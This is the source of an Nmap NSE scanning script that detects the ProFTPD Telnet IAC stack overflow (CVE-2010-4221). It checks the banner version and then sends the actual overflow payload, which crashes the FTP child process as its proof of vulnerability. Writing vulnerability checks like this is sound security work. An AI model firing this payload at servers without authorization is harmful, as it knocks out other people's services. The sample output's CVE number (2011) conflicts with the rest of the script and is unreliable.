description = [[
Checks for a stack-based buffer overflow in the ProFTPD server, version
between 1.3.2rc3 and 1.3.3b. By sending a large number of TELNET_IAC escape
sequence, the proftpd process miscalculates the buffer length, and a remote
attacker will be able to corrupt the stack and execute arbitrary code within
the context of the proftpd process (CVE-2010-4221). Authentication is not
required to exploit this vulnerability.

Reference:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221
* http://www.exploit-db.com/exploits/15449/
* http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac
]]

---
-- @usage
-- nmap --script ftp-vuln-cve2010-4221 -p 21 <host>
--
-- @output
-- PORT   STATE SERVICE
-- 21/tcp open  ftp
-- | ftp-vuln-cve2010-4221:
-- |   ProFTPD version: 1.3.2e
-- |   ProFTPD Telnet IAC buffer overflow (CVE-2011-4221):
-- |_    ProFTPD (CVE-2011-4221): VULNERABLE 

author = "Djalal Harouni"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}

require "ftp"
require "shortport"
require "stdnse"

portrule = function (host, port)
  if port.version.product ~= nil and port.version.product ~= "ProFTPD" then
    return false
  end
  return shortport.port_or_service(21, "ftp")(host, port)
end

local function get_proftpd_banner(response)
  local banner, version
  banner = response:match("^%d+%s(.*)")
  if banner and banner:match("ProFTPD") then
    version = banner:match("ProFTPD%s([%w%.]+)%s")
  end
  return banner, version
end

local function ftp_finish(socket, status, message)
  if socket then
    socket:close()
  end
  return status, message
end

-- Returns true if the provided version is vulnerable
local function is_version_vulnerable(version)
  local vers = stdnse.strsplit("%.", version)
  
  if #vers > 0 and vers[3] then
    local relnum = string.sub(vers[3], 1, 1)
    local extra = string.sub(vers[3], 2)
    if relnum == '2' then
      if extra:len() > 0 then
        if extra:match("rc%d") then
          local v = string.sub(extra, 3)
          if v and tonumber(v) > 2 then
            return true
          end
        else
          return true
        end
      end
    elseif relnum == '3' then
      if extra:len() == 0 or extra:match("[abrc]") then
      	return true
      end
    end
  end

  return false
end

-- Returns true, true if the ProFTPD child was killed
local function kill_proftpd(socket)
  local killed = false
  local TELNET_KILL = '\000'..'\255' -- TELNET_DUMMY..TELNET_IAC
  
  stdnse.print_debug(2, "%s: sending evil TELNET_IAC commands.",
                        SCRIPT_NAME)
  local st, ret = socket:send(string.rep(TELNET_KILL, 4069)..
                        '\255'..string.rep("Nmap", 256).."\n")
  if not st then
    return st, ret
  end

  -- We should receive command error if it's not vulnerable
  st, ret = socket:receive_lines(1)
  if not st then
    if ret == "EOF" then -- "connection closed"
      stdnse.print_debug(2, "%s: remote proftpd child was killed.",
                            SCRIPT_NAME)
      killed = true
    else
      return st, ret
    end
  end

  return true, killed
end

local function check_proftpd(ftp_opts)
  local out, ftp_server = {}, {}
  local cve, proftpd_vuln = "CVE-2010-4221", ""
  local proftpd_str = "ProFTPD Telnet IAC buffer overflow ("..cve.."):"
  local socket, ret = ftp.connect(ftp_opts.host, ftp_opts.port,
                                 {recv_before = true})
  if not socket then
    return socket, ret
  end

  ftp_server.banner, ftp_server.version = get_proftpd_banner(ret)
  if not ftp_server.banner then
    return ftp_finish(socket, false, "failed to get FTP banner.")
  end

  -- check if this version is vulnerable
  if ftp_server.version then
    if not is_version_vulnerable(ftp_server.version) then
      return ftp_finish(socket, false, "ProFTPD is NOT VULENRABLE.")
    end
    table.insert(out, string.format("ProFTPD version: %s",
                                    ftp_server.version))
    proftpd_vuln = string.format("  ProFTPD (%s): LIKELY VULNERABLE", cve)
  end

  local status, killed = kill_proftpd(socket)
  if not status then
    return ftp_finish(socket, false, killed)
  elseif killed then
    proftpd_vuln = string.format("  ProFTPD (%s): VULNERABLE", cve)
  end

  table.insert(out, proftpd_str)
  table.insert(out, proftpd_vuln)
  return ftp_finish(socket, true, out)
end

action = function(host, port)
  local ftp_opts = {
    host = host,
    port = port,
  }
  local status, output = check_proftpd(ftp_opts)
  if not status then
    stdnse.print_debug(1, "%s: %s", SCRIPT_NAME, output)
    return nil
  end
  return stdnse.format_output(status, output)
end
